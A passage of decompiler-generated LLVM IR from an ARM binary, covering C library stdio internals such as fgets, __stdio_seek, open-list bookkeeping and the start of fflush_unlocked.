  store i32 %v5_1a258, i32* @r4, align 4
  %v3_1a25c = sdiv i32 %v5_1a258, 256
  store i32 %v3_1a25c, i32* %r3.global-to-local, align 4
  %v1_1a260 = trunc i32 %v3_1a25c to i8
  %v2_1a260 = load i32, i32* @r8, align 4
  %v3_1a260 = add i32 %v2_1a260, 1
  %v4_1a260 = inttoptr i32 %v3_1a260 to i8*
  store i8 %v1_1a260, i8* %v4_1a260, align 1
  %v0_1a264 = load i32, i32* @r4, align 4
  %v1_1a264 = trunc i32 %v0_1a264 to i8
  %v2_1a264 = load i32, i32* @r8, align 4
  %v3_1a264 = inttoptr i32 %v2_1a264 to i8*
  store i8 %v1_1a264, i8* %v3_1a264, align 1
  %v0_1a268 = load i32, i32* @r5, align 4
  %v1_1a268 = load i32, i32* @r6, align 4
  %v2_1a268 = inttoptr i32 %v1_1a268 to i32*
  store i32 %v0_1a268, i32* %v2_1a268, align 4
  %v0_1a26c = load i32, i32* @r8, align 4
  %v1_1a26c = add i32 %v0_1a26c, 8
  %v2_1a26c = inttoptr i32 %v1_1a26c to i32*
  %v3_1a26c = load i32, i32* %v2_1a26c, align 4
  store i32 %v3_1a26c, i32* %r3.global-to-local, align 4
  %v2_1a270 = icmp eq i32 %v3_1a26c, 0
  store i1 %v2_1a270, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a270, label %dec_label_pc_1a278, label %bb37

dec_label_pc_1a278:                               ; preds = %bb36
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_1a27c = call i32 @malloc(i32 4096)
  store i32 %v1_1a27c, i32* %r0.global-to-local, align 4
  %v2_1a280 = icmp eq i32 %v1_1a27c, 0
  store i1 %v2_1a280, i1* %cpsr_z.global-to-local, align 1
  %v1_1a294.pre = load i32, i32* @r8, align 4
  br i1 %v2_1a280, label %.thread7.thread, label %.thread8

.thread7.thread:                                  ; preds = %dec_label_pc_1a278
  %v2_1a29420 = add i32 %v1_1a294.pre, 8
  %v3_1a29421 = inttoptr i32 %v2_1a29420 to i32*
  store i32 0, i32* %v3_1a29421, align 4
  br label %.thread10

.thread8:                                         ; preds = %dec_label_pc_1a278
  %v2_1a284 = inttoptr i32 %v1_1a294.pre to i32*
  %v3_1a284 = load i32, i32* %v2_1a284, align 4
  %v2_1a288 = or i32 %v3_1a284, 16384
  store i32 %v2_1a288, i32* %r3.global-to-local, align 4
  %v2_1a28c = add i32 %v1_1a27c, 4096
  store i32 %v2_1a28c, i32* %r2.global-to-local, align 4
  %v4_1a290 = sdiv i32 %v2_1a288, 256
  store i32 %v4_1a290, i32* %r1.global-to-local, align 4
  %v2_1a294 = add i32 %v1_1a294.pre, 8
  %v3_1a294 = inttoptr i32 %v2_1a294 to i32*
  store i32 %v1_1a27c, i32* %v3_1a294, align 4
  %v1_1a298 = load i32, i32* %r2.global-to-local, align 4
  %v2_1a298 = load i32, i32* @r8, align 4
  %v3_1a298 = add i32 %v2_1a298, 12
  %v4_1a298 = inttoptr i32 %v3_1a298 to i32*
  store i32 %v1_1a298, i32* %v4_1a298, align 4
  %v1_1a29c = load i32, i32* %r1.global-to-local, align 4
  %v2_1a29c = trunc i32 %v1_1a29c to i8
  %v3_1a29c = load i32, i32* @r8, align 4
  %v4_1a29c = add i32 %v3_1a29c, 1
  %v5_1a29c = inttoptr i32 %v4_1a29c to i8*
  store i8 %v2_1a29c, i8* %v5_1a29c, align 1
  %v0_1a2a0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a2a0.pr.pr, label %.thread10, label %.thread9

.thread9:                                         ; preds = %.thread8
  %v1_1a2a0 = load i32, i32* %r3.global-to-local, align 4
  %v2_1a2a0 = trunc i32 %v1_1a2a0 to i8
  %v3_1a2a0 = load i32, i32* @r8, align 4
  %v4_1a2a0 = inttoptr i32 %v3_1a2a0 to i8*
  store i8 %v2_1a2a0, i8* %v4_1a2a0, align 1
  %v0_1a2a4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a2a4.pr.pr, label %.thread10, label %bb37

.thread10:                                        ; preds = %.thread7.thread, %.thread8, %.thread9
  %v2_1a2a4 = load i32, i32* @r8, align 4
  %v3_1a2a4 = add i32 %v2_1a2a4, 12
  %v4_1a2a4 = inttoptr i32 %v3_1a2a4 to i32*
  store i32 %v1_1a27c, i32* %v4_1a2a4, align 4
  br label %bb37

bb37:                                             ; preds = %bb36, %.thread9, %.thread10
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2891c.1192 to i32), i32* %r3.global-to-local, align 4
  %v2_1a2b0 = load i32, i32* @r8, align 4
  %v3_1a2b0 = add i32 %v2_1a2b0, 2
  %v4_1a2b0 = inttoptr i32 %v3_1a2b0 to i8*
  store i8 0, i8* %v4_1a2b0, align 1
  %v0_1a2b4 = load i32, i32* @r8, align 4
  %v1_1a2b4 = add i32 %v0_1a2b4, 1
  %v2_1a2b4 = inttoptr i32 %v1_1a2b4 to i8*
  %v3_1a2b4 = load i8, i8* %v2_1a2b4, align 1
  %v4_1a2b4 = zext i8 %v3_1a2b4 to i32
  store i32 %v4_1a2b4, i32* %r2.global-to-local, align 4
  %v2_1a2b8 = load i32, i32* @global_var_2891c.1192, align 4
  store i32 %v2_1a2b8, i32* %r1.global-to-local, align 4
  %v1_1a2bc = add i32 %v0_1a2b4, 8
  %v2_1a2bc = inttoptr i32 %v1_1a2bc to i32*
  %v3_1a2bc = load i32, i32* %v2_1a2bc, align 4
  store i32 %v3_1a2bc, i32* %r3.global-to-local, align 4
  %v1_1a2c0 = and i32 %v4_1a2b4, 32
  %v2_1a2c0 = icmp eq i32 %v1_1a2c0, 0
  store i1 %v2_1a2c0, i1* %cpsr_z.global-to-local, align 1
  %v2_1a2c4 = add i32 %v0_1a2b4, 20
  %v3_1a2c4 = inttoptr i32 %v2_1a2c4 to i32*
  store i32 %v3_1a2bc, i32* %v3_1a2c4, align 4
  %v0_1a2c8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a2c8 = load i32, i32* @r8, align 4
  %v2_1a2c8 = add i32 %v1_1a2c8, 44
  %v3_1a2c8 = inttoptr i32 %v2_1a2c8 to i32*
  store i32 %v0_1a2c8, i32* %v3_1a2c8, align 4
  %v0_1a2cc = load i32, i32* %r1.global-to-local, align 4
  %v1_1a2cc = load i32, i32* @r8, align 4
  %v2_1a2cc = add i32 %v1_1a2cc, 52
  %v3_1a2cc = inttoptr i32 %v2_1a2cc to i32*
  store i32 %v0_1a2cc, i32* %v3_1a2cc, align 4
  %v0_1a2d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a2d0 = load i32, i32* @r8, align 4
  %v2_1a2d0 = add i32 %v1_1a2d0, 24
  %v3_1a2d0 = inttoptr i32 %v2_1a2d0 to i32*
  store i32 %v0_1a2d0, i32* %v3_1a2d0, align 4
  %v0_1a2d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a2d4 = load i32, i32* @r8, align 4
  %v2_1a2d4 = add i32 %v1_1a2d4, 28
  %v3_1a2d4 = inttoptr i32 %v2_1a2d4 to i32*
  store i32 %v0_1a2d4, i32* %v3_1a2d4, align 4
  %v0_1a2d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a2d8 = load i32, i32* @r8, align 4
  %v2_1a2d8 = add i32 %v1_1a2d8, 16
  %v3_1a2d8 = inttoptr i32 %v2_1a2d8 to i32*
  store i32 %v0_1a2d8, i32* %v3_1a2d8, align 4
  br i1 %v2_1a2c0, label %dec_label_pc_1a36c, label %dec_label_pc_1a2e0

dec_label_pc_1a2e0:                               ; preds = %bb37
  %v2_1a2e0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1a2e0, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_176c8.894 to i32), i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_28904.890 to i32), i32* %r2.global-to-local, align 4
  %v1_1a2f8 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_28904.890 to i32), i32* %r0.global-to-local, align 4
  %v1_1a308 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32* @global_var_288ec.888 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_1a0bc, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_176c8.894 to i32), i32* %r1.global-to-local, align 4
  %v1_1a31c = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_288ec.888 to i32), i32* %r0.global-to-local, align 4
  %v1_1a328 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_288e8.892 to i32), i32* %r2.global-to-local, align 4
  %v2_1a330 = load i32, i32* bitcast (i32** @global_var_288e8.892 to i32*), align 4
  store i32 %v2_1a330, i32* %r3.global-to-local, align 4
  store i32 %v2_1a0bc, i32* @r0, align 4
  %v1_1a338 = load i32, i32* @r8, align 4
  %v2_1a338 = add i32 %v1_1a338, 32
  %v3_1a338 = inttoptr i32 %v2_1a338 to i32*
  store i32 %v2_1a330, i32* %v3_1a338, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_1a344 = load i32, i32* @r8, align 4
  %v1_1a344 = load i32, i32* %r2.global-to-local, align 4
  %v2_1a344 = inttoptr i32 %v1_1a344 to i32*
  store i32 %v0_1a344, i32* %v2_1a344, align 4
  %v1_1a34c = call i32 @__pthread_return_void()
  store i32 %v2_1a2e0, i32* @r0, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 107364, i32* @lr, align 4
  %v1_1a360 = call i32 @__pthread_return_void()
  store i32 %v1_1a360, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a36c

dec_label_pc_1a368:                               ; preds = %dec_label_pc_1a0fc, %dec_label_pc_1a0e8, %dec_label_pc_1a108
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_1a36c

dec_label_pc_1a36c:                               ; preds = %bb37, %dec_label_pc_1a140, %dec_label_pc_1a2e0, %dec_label_pc_1a368
  %v0_1a36c = load i32, i32* @r8, align 4
  store i32 %v0_1a36c, i32* %r0.global-to-local, align 4
  %v2_1a374 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1a374, i32* @r4, align 4
  store i32 %v6_1a0b0, i32* @r5, align 4
  store i32 %v9_1a0b0, i32* @r6, align 4
  store i32 %v15_1a0b0, i32* @r8, align 4
  ret i32 %v0_1a36c

; uselistorder directives
  uselistorder i32 %v1_1a294.pre, { 1, 0, 2 }
  uselistorder i32 %v1_1a27c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v3_1a25c, { 1, 0 }
  uselistorder i32 %v3_1a1f01, { 1, 0 }
  uselistorder i32 %v0_1a1d0, { 1, 0 }
  uselistorder i1 %v7_1a1c4, { 1, 0 }
  uselistorder i32 %v1_1a194, { 1, 0 }
  uselistorder i32 %v0_1a194, { 1, 0 }
  uselistorder i32 %v1_1a17c, { 1, 0, 2 }
  uselistorder i32 %v1_1a130, { 1, 0 }
  uselistorder i32 %v0_1a0fc, { 1, 0, 2 }
  uselistorder i1 %v7_1a0dc, { 1, 0 }
  uselistorder i1 %v7_1a0d0, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 3, 4, 5, 7, 6, 8, 10, 9, 12, 11, 14, 13, 15, 17, 16, 19, 18, 20 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 16384, { 15, 0, 5, 10, 3, 11, 4, 12, 1, 13, 2, 14, 6, 7, 8, 9 }
  uselistorder i32 4096, { 11, 3, 12, 1, 2, 4, 5, 9, 10, 6, 13, 7, 14, 0, 8 }
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder i32 (i8*, i32)* @__libc_open, { 2, 5, 0, 1, 3, 4 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 1, 0, 9, 8, 7, 6, 13, 12, 11, 10, 5, 4, 3, 2 }
  uselistorder i32 1024, { 20, 21, 22, 0, 23, 24, 2, 25, 1, 3, 15, 16, 17, 4, 5, 18, 6, 19, 7, 10, 11, 9, 12, 8, 13, 14 }
  uselistorder i32 ()* @__stdio_init_mutex, { 0, 4, 3, 2, 1 }
  uselistorder i8 43, { 2, 0, 1 }
  uselistorder i32 (i32)* @free, { 14, 0, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 17, 13, 16, 15, 1 }
  uselistorder i32 22, { 0, 12, 3, 13, 4, 10, 5, 6, 7, 16, 14, 8, 15, 9, 1, 2, 11 }
  uselistorder label %dec_label_pc_1a36c, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1a368, { 2, 0, 1 }
  uselistorder label %bb37, { 2, 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %bb36, { 1, 0 }
  uselistorder label %dec_label_pc_1a1c4._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1a16c, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_1a118, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a0e8, { 1, 2, 0 }
}

define i32 @"$d"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1a378:
  %v0_1a378 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1a378, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1a378
  %v5_1a378 = sdiv i32 %arg2, 16
  %v6_1a378 = and i32 %v5_1a378, %arg1
  %v5_1a37c = sdiv i32 %arg2, 256
  %v6_1a37c = and i32 %v6_1a378, %v5_1a37c
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1a378, %bb
  %v7_1a37c = phi i32 [ %arg1, %dec_label_pc_1a378 ], [ %v6_1a37c, %bb ]
  ret i32 %v7_1a37c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %v3_1a3ac = load i32, i32* @r4, align 4
  %v6_1a3ac = load i32, i32* @lr, align 4
  %v1_1a3b0 = add i32 %arg1, 4
  %v2_1a3b0 = inttoptr i32 %v1_1a3b0 to i32*
  %v3_1a3b0 = load i32, i32* %v2_1a3b0, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_1a3b8 = load i32, i32* %arg2, align 4
  %v3_1a3b8 = add i32 %tmp, 4
  %v4_1a3b8 = inttoptr i32 %v3_1a3b8 to i32*
  %v5_1a3b8 = load i32, i32* %v4_1a3b8, align 4
  %v6_1a3bc = call i32 @__libc_lseek64(i32 %v3_1a3b0, i32 %v2_1a3b8, i32 %v5_1a3b8, i32 %arg3, i32 %v3_1a3ac, i32 %v6_1a3ac)
  %v1_1a3c0 = icmp slt i32 %v2_1a3b8, 0
  %v6_1a3bc. = select i1 %v1_1a3c0, i32 %v6_1a3bc, i32 0
  store i32 %v6_1a3bc., i32* %r3.global-to-local, align 4
  br i1 %v1_1a3c0, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v3_1a3cc = load i32, i32* @r4, align 4
  %v4_1a3cc = inttoptr i32 %v3_1a3cc to i32*
  store i32 %v6_1a3bc, i32* %v4_1a3cc, align 4
  %v6_1a3cc = add i32 %v3_1a3cc, 4
  %v7_1a3cc = inttoptr i32 %v6_1a3cc to i32*
  store i32 %v2_1a3b8, i32* %v7_1a3cc, align 4
  %v0_1a3d0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v0_1a3d0 = phi i32 [ %v6_1a3bc, %entry ], [ %v0_1a3d0.pre, %bb ]
  ret i32 %v0_1a3d0

; uselistorder directives
  uselistorder i32 %v6_1a3bc, { 0, 2, 1 }
  uselistorder i32 %v2_1a3b8, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1a3d8 = load i32, i32* @r4, align 4
  store i32 %v3_1a3d8, i32* %stack_var_-24, align 4
  %v6_1a3d8 = load i32, i32* @r5, align 4
  %v9_1a3d8 = load i32, i32* @r6, align 4
  %v12_1a3d8 = load i32, i32* @r7, align 4
  %v1_1a3dc = add i32 %arg3, 52
  %v2_1a3dc = inttoptr i32 %v1_1a3dc to i32*
  %v3_1a3dc = load i32, i32* %v2_1a3dc, align 4
  store i32 %v3_1a3dc, i32* %r8.global-to-local, align 4
  %v2_1a3e0 = ptrtoint i32* %stack_var_-40 to i32
  %v1_1a3e4 = add i32 %arg3, 56
  store i32 %v1_1a3e4, i32* @r5, align 4
  %v2_1a3e8 = icmp eq i32 %v3_1a3dc, 0
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %v2_1a3e0, i32* @r0, align 4
  br i1 %v2_1a3e8, label %dec_label_pc_1a408, label %dec_label_pc_1a424

dec_label_pc_1a408:                               ; preds = %entry
  %v1_1a410 = call i32 @__pthread_return_void()
  store i32 107556, i32* @lr, align 4
  %v1_1a420 = call i32 @__pthread_return_0()
  %v0_1a424.pre = load i32, i32* @r6, align 4
  %v0_1a428.pre = load i32, i32* @r4, align 4
  %v0_1a42c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1a424

dec_label_pc_1a424:                               ; preds = %entry, %dec_label_pc_1a408
  %v0_1a42c = phi i32 [ %arg1, %entry ], [ %v0_1a42c.pre, %dec_label_pc_1a408 ]
  %v0_1a428 = phi i32 [ %arg3, %entry ], [ %v0_1a428.pre, %dec_label_pc_1a408 ]
  %v0_1a424 = phi i32 [ %arg2, %entry ], [ %v0_1a424.pre, %dec_label_pc_1a408 ]
  %v3_1a430 = inttoptr i32 %v0_1a42c to i8*
  %v4_1a430 = call i32 @__GI_fgets_unlocked(i8* %v3_1a430, i32 %v0_1a424, i32 %v0_1a428)
  %v0_1a434 = load i32, i32* %r8.global-to-local, align 4
  %v2_1a434 = icmp eq i32 %v0_1a434, 0
  store i32 %v4_1a430, i32* %r4.global-to-local, align 4
  br i1 %v2_1a434, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1a424
  store i32 107600, i32* @lr, align 4
  call void @__pseudo_branch(i32 95952)
  %v0_1a450.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1a424, %bb
  %v0_1a450 = phi i32 [ %v4_1a430, %dec_label_pc_1a424 ], [ %v0_1a450.pre, %bb ]
  %v2_1a458 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1a458, i32* @r4, align 4
  store i32 %v6_1a3d8, i32* @r5, align 4
  store i32 %v9_1a3d8, i32* @r6, align 4
  store i32 %v12_1a3d8, i32* @r7, align 4
  ret i32 %v0_1a450

; uselistorder directives
  uselistorder i32 52, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_1a424, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v2_1a470 = ptrtoint i32* %stack_var_-48 to i32
  %v2_1a474 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1a474, i32* @r0, align 4
  store i32 95952, i32* %r4.global-to-local, align 4
  %v1_1a488 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_176c8.894 to i32), i32* %r5.global-to-local, align 4
  %v1_1a498 = call i32 @__pthread_return_0()
  %v2_1a4a0 = load i32, i32* @global_var_2cc60.1176, align 4
  %v7_1a4a4 = icmp eq i32 %v2_1a4a0, 1
  br i1 %v7_1a4a4, label %dec_label_pc_1a4ac, label %dec_label_pc_1a558

dec_label_pc_1a4ac:                               ; preds = %entry
  %v2_1a4b0 = load i32, i32* @global_var_2cc64.1180, align 4
  %tmp19 = icmp slt i32 %v2_1a4b0, 1
  br i1 %tmp19, label %dec_label_pc_1a558, label %dec_label_pc_1a4bc

dec_label_pc_1a4bc:                               ; preds = %dec_label_pc_1a4ac
  store i32 %v2_1a470, i32* @r0, align 4
  %v1_1a4cc = call i32 @__pthread_return_void()
  %v1_1a4d8 = call i32 @__pthread_return_0()
  %v2_1a4e0 = load i32, i32* bitcast (i32** @global_var_288e8.892 to i32*), align 4
  store i32 %v2_1a4e0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_1a5303 = icmp eq i32 %v2_1a4e0, 0
  br i1 %v2_1a5303, label %dec_label_pc_1a53c, label %dec_label_pc_1a4ec

dec_label_pc_1a4ec:                               ; preds = %dec_label_pc_1a4bc, %dec_label_pc_1a52c
  %v1_1a504 = phi i32 [ %v0_1a52c, %dec_label_pc_1a52c ], [ %v2_1a4e0, %dec_label_pc_1a4bc ]
  %v1_1a4ec = inttoptr i32 %v1_1a504 to i8*
  %v2_1a4ec = load i8, i8* %v1_1a4ec, align 1
  %v3_1a4ec = zext i8 %v2_1a4ec to i32
  %v1_1a4f0 = add i32 %v1_1a504, 1
  %v2_1a4f0 = inttoptr i32 %v1_1a4f0 to i8*
  %v3_1a4f0 = load i8, i8* %v2_1a4f0, align 1
  %v4_1a4f0 = zext i8 %v3_1a4f0 to i32
  %v4_1a4f4 = mul nuw nsw i32 %v4_1a4f0, 256
  %v5_1a4f4 = or i32 %v4_1a4f4, %v3_1a4ec
  %v2_1a4f8 = and i32 %v5_1a4f4, 32816
  %v7_1a4fc = icmp eq i32 %v2_1a4f8, 48
  %v1_1a500 = add i32 %v1_1a504, 32
  %v2_1a500 = inttoptr i32 %v1_1a500 to i32*
  %v3_1a500 = load i32, i32* %v2_1a500, align 4
  store i32 %v3_1a500, i32* %r5.global-to-local, align 4
  br i1 %v7_1a4fc, label %dec_label_pc_1a50c, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_1a4ec
  store i32 %v1_1a504, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1a52c

dec_label_pc_1a50c:                               ; preds = %dec_label_pc_1a4ec
  %v0_1a50c = load i32, i32* %r6.global-to-local, align 4
  %v2_1a50c = icmp eq i32 %v0_1a50c, 0
  br i1 %v2_1a50c, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_1a50c
  %v3_1a514 = add i32 %v0_1a50c, 32
  %v4_1a514 = inttoptr i32 %v3_1a514 to i32*
  store i32 %v3_1a500, i32* %v4_1a514, align 4
  %v0_1a51c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_1a50c
  store i32 %v3_1a500, i32* bitcast (i32** @global_var_288e8.892 to i32*), align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_1a51c = phi i32 [ %v0_1a51c.pre, %.thread ], [ %v1_1a504, %.thread1 ]
  %v1_1a51c = add i32 %v0_1a51c, 1
  %v2_1a51c = inttoptr i32 %v1_1a51c to i8*
  %v3_1a51c = load i8, i8* %v2_1a51c, align 1
  %v1_1a520 = and i8 %v3_1a51c, 32
  %v1_1a528 = icmp ne i8 %v1_1a520, 0
  call void @__pseudo_cond_branch(i1 %v1_1a528, i32 ptrtoint (i32* @global_var_167b4.1142 to i32))
  %v0_1a52c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1a52c

dec_label_pc_1a52c:                               ; preds = %.thread12, %bb
  %v0_1a52c = phi i32 [ %v0_1a52c.pre, %bb ], [ %v3_1a500, %.thread12 ]
  store i32 %v0_1a52c, i32* %r4.global-to-local, align 4
  %v2_1a530 = icmp eq i32 %v0_1a52c, 0
  br i1 %v2_1a530, label %dec_label_pc_1a53c, label %dec_label_pc_1a4ec

dec_label_pc_1a53c:                               ; preds = %dec_label_pc_1a52c, %dec_label_pc_1a4bc
  store i32 %v2_1a470, i32* @r0, align 4
  %v1_1a54c = call i32 @__pthread_return_void()
  %v0_1a554 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1a554, i32* @global_var_2cc64.1180, align 4
  %v2_1a55c.pre = load i32, i32* @global_var_2cc60.1176, align 4
  br label %dec_label_pc_1a558

dec_label_pc_1a558:                               ; preds = %entry, %dec_label_pc_1a4ac, %dec_label_pc_1a53c
  %v2_1a55c = phi i32 [ %v2_1a4a0, %entry ], [ 1, %dec_label_pc_1a4ac ], [ %v2_1a55c.pre, %dec_label_pc_1a53c ]
  %v1_1a560 = add i32 %v2_1a55c, -1
  store i32 %v1_1a560, i32* @global_var_2cc60.1176, align 4
  store i32 %v2_1a474, i32* @r0, align 4
  store i32 107900, i32* @lr, align 4
  %v1_1a578 = call i32 @__pthread_return_void()
  ret i32 %v1_1a578

; uselistorder directives
  uselistorder i32 %v0_1a52c, { 2, 1, 0 }
  uselistorder i32 %v3_1a500, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1a504, { 0, 1, 2, 4, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i8 32, { 0, 7, 1, 2, 3, 5, 4, 8, 9, 10, 6, 11, 12, 13 }
  uselistorder i32* @global_var_2cc64.1180, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1a558, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a52c, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_1a4ec, { 1, 0 }
}

define i32 @fflush_unlocked(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_1a5ac = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32** @global_var_288e8.892 to i32), i32* %r3.global-to-local, align 4
  %v10_1a5b4 = icmp eq i8* %arg1, bitcast (i32** @global_var_288e8.892 to i8*)
  store i1 %v10_1a5b4, i1* %cpsr_z.global-to-local, align 1
  %.v1_1a5b8 = select i1 %v10_1a5b4, i32 0, i32 %tmp
  store i32 %.v1_1a5b8, i32* %r8.global-to-local, align 4
  %v2_1a5c0 = ptrtoint i32* %stack_var_-44 to i32
  br i1 %v10_1a5b4, label %bb, label %dec_label_pc_1a5cc

bb:                                               ; preds = %entry
  store i32 %.v1_1a5b8, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1a5d8

dec_label_pc_1a5cc:                               ; preds = %entry
  %v2_1a5cc = icmp eq i32 %.v1_1a5b8, 0
  store i1 %v2_1a5cc, i1* %cpsr_z.global-to-local, align 1
  store i32 256, i32* %sl.global-to-local, align 4
  br i1 %v2_1a5cc, label %dec_label_pc_1a5d8, label %dec_label_pc_1a724

dec_label_pc_1a5d8:                               ; preds = %bb, %dec_label_pc_1a5cc
  store i32 ptrtoint (i8* @global_var_176c8.894 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_1a5c0, i32* @r0, align 4
  %v1_1a5ec = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_28904.890 to i32), i32* %r0.global-to-local, align 4
  %v1_1a5fc = call i32 @__pthread_return_0()
  %v2_1a604 = load i32, i32* @global_var_2cc60.1176, align 4
  %v1_1a608 = add i32 %v2_1a604, 1
  store i32 %v1_1a608, i32* %r3.global-to-local, align 4
  store i32 %v1_1a608, i32* @global_var_2cc60.1176, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_1a5c0, i32* @r0, align 4
  %v1_1a620 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_176c8.894 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_1a5c0, i32* @r0, align 4
  %v1_1a634 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_288ec.888 to i32), i32* %r0.global-to-local, align 4
  %v1_1a640 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_288e8.892 to i32), i32* %r3.global-to-local, align 4
  store i32 %v2_1a5c0, i32* @r0, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_1a650 = load i32, i32* bitcast (i32** @global_var_288e8.892 to i32*), align 4
  store i32 %v2_1a650, i32* @r6, align 4
  %v1_1a658 = call i32 @__pthread_return_void()
  store i32 %v1_1a658, i32* %r0.global-to-local, align 4
  store i32 %v2_1a5c0, i32* @r4, align 4
  %v0_1a660 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1a660, i32* @r5, align 4
  %v0_1a714.pr = load i32, i32* @r6, align 4
